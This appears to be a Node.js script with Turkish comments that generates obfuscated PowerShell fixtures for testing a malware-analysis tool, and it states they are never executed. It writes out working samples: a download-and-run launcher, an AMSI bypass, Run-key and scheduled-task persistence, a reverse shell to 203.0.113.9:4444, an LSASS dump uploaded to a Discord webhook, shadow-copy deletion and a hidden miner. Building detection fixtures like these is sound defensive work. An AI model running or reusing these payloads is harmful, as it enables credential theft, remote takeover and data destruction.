// Rapor/tehdit testlerinin örneklerini üretir: node scripts/make-analyze-fixtures.js
// Zararlı betiklere benzeyen ama hiçbir zaman çalıştırılmayan, gizlenmiş örnekler. Diske XOR + base64 (.ps1.x) yazılır,
// yalnızca bellekte çözülür (test/fixture-codec.js). Adresler belge aralıklarıdır (198.51.100.0/24, 203.0.113.0/24,
// example.net); şüpheli dizgeler parçalı kurulur.
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { deflateRawSync } from 'node:zlib';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/analyze-fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const j = (...p) => p.join('');
const utf16 = (s) => Buffer.from(s, 'utf16le').toString('base64');
const codes = (s) => [...s].map((c) => c.charCodeAt(0)).join(',');
const fx = {};

// indir-çalıştır: -EncodedCommand başlatıcı + indirme sarmalı + iex
fx.dropper = `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ${utf16(j('IE', 'X (New-Object Net.Web', "Client).DownloadString('http://198.51.100.7/stage2.ps1')"))}
`;

// AMSI atlatma: dizge birleştirme ile gizlenmiş tür ve alan adları
fx.amsi = `$t = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}' -f '${j('Am', 'si')}','${j('Ut', 'ils')}'))
$f = $t.GetField(('${j('am', 'si')}'+'${j('Init', 'Failed')}'),'NonPublic,Static')
$f.SetValue($null,$true)
`;

// kalıcılık: Run anahtarı ve zamanlanmış görev, -f yeniden sıralama ile
fx.persistence = `$k = ("{2}{0}{1}" -f 'Microsoft\\Windows\\CurrentVersion\\','Run','HKCU:\\Software\\')
Set-ItemProperty -Path $k -Name 'Updater' -Value 'powershell -w hidden -f C:\\Users\\Public\\u.ps1'
& ('sch'+'tasks') /create /tn 'Updater' /tr 'powershell -w hidden -f C:\\Users\\Public\\u.ps1' /sc onlogon
`;

// ters kabuk: raw deflate + base64 katmanı içinde TCP istemcisi ve iex
const shell = j("$c = New-Object Net.Sockets.TCP", "Client('203.0.113.9', 4444)\n$s = $c.GetStream()\n[byte[]]$b = 0..65535|%{0}\n",
  'while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {\n  $d = (New-Object Text.ASCIIEncoding).GetString($b, 0, $i)\n  $o = (', 'iex $d 2>&1 | Out-String)\n',
  '  $r = ([Text.Encoding]::ASCII).GetBytes($o)\n  $s.Write($r, 0, $r.Length)\n}\n');
fx.revshell = `.( $PSHome[4]+$PSHome[30]+'x') (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('${deflateRawSync(Buffer.from(shell)).toString('base64')}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
`;

// kimlik hırsızlığı + sızdırma: karakter kodlarıyla gizlenmiş LSASS dökümü ve Discord webhook'a yükleme
const steal = j('rundll32.exe C:\\Windows\\System32\\comsvcs.dll, Mini', "Dump 624 C:\\Users\\Public\\l.dmp full\n",
  "Invoke-RestMethod -Uri 'https://discord.com/api/web", "hooks/123456789/abcdefghijklmnop' -Method Post -InFile 'C:\\Users\\Public\\l.dmp'");
fx.stealer = `${j('I', 'EX')} (-join ([char[]](${codes(steal)})))
`;

// yıkıcı: XOR ile gizlenmiş gölge kopya silme ve kurtarma kapatma
const wipe = j('vssadmin delete ', 'shadows /all /quiet\nbcdedit /set {default} recovery', 'enabled No');
fx.wiper = `${j('I', 'EX')} (-join ('${[...Buffer.from(wipe)].map((b) => (b ^ 0x5a).toString(16)).join(',')}'.Split(',') | % { [char]([Convert]::ToInt16($_, 16) -bxor 0x5A) }))
`;

// madenci: ters çevrilmiş dizgede havuz adresi
const miner = j('Start-Process -WindowStyle Hidden -FilePath "$env:TEMP\\xm', 'rig.exe" -ArgumentList \'-o stratum+tcp://pool.example.net:3333 -u wallet --donate-level 1\'');
fx.miner = `$m = '${[...miner].reverse().join('').replace(/'/g, "''")}'
${j('I', 'EX')} ($m[-1..-($m.Length)] -join '')
`;

// zararsız: yalnızca gizlenmiş bir selam (tehdit yok)
fx.benign = `&("{1}{0}" -f 'put','Write-Out') ("{0}{1}" -f 'Mer','haba')
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.ps1.x`, dir), encodeFixture(Buffer.from(src)));
console.log(`${Object.keys(fx).length} analiz örneği yazıldı`);
